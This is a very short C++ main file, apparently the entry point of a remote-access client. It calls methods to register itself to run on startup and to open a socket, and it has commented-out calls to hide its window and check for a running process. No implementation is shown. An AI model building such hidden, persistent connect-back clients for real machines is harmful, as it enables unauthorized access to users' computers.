#include "socket.h"

int main() {
	Client client;
	// client.Hide();
	client.SaveOnStartUp();
	
	// if (client.CheckProcess("notepad.exe")) {
	// 	std::cout << "running." << '\n';
	// }

	client.CreateSocket();

	return 0;
}